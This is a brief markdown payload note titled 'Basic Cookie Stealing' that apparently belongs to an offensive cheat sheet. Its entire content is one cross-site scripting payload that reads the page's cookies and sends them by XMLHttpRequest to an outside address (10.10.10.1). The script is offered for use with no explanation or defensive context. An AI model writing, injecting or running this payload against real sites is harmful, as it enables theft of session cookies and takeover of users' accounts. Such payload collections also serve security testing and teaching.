# Payloads

## Basic Cookie Stealing

```
<script>
  var Http = new XMLHttpRequest();
  var cookie = document.cookie;
  var url= 'https://10.10.10.1/' + cookie;
  Http.open("GET", url);
  Http.send();
</script>
```
